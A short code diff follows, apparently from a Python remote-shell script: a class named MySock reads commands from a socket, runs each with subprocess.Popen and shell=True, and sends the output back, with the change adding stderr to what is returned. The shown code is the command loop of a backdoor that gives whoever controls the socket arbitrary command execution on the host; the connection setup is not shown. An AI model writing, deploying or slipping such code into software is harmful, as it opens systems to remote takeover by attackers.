@@ -20,6 +20,7 @@ class MySock:
             commands = self.s.recv(1024)
             cmd = subprocess.Popen(commands, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             self.s.send(cmd.stdout.read())
+            self.s.send(cmd.stderr.read())
             
 if __name__ == '__main__':
     my_sock = MySock()
